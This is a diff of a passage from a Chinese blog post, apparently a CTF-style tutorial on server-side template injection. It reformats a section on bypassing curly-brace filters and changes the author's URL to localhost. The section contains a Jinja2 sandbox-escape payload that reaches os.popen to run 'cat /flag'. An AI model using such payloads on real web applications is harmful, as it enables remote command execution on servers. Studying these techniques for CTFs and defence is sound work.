@@ -114,11 +114,9 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤大括号
 
-使用`{%%}`替代`{{}}`，payload:
+  使用\{\%\%\}替代\{\{\}\}，payload:
 
-```markdown
-{% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %}
-```
+  \{\% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) \%\}
 
 - ## 过滤引号
 
@@ -161,5 +159,5 @@ file、subprocess.Popen、os.popen、exec、eval
 ---
 
 > 作者: Hinoatari  
-> URL: https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/  
+> URL: http://localhost:1313/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/  
 
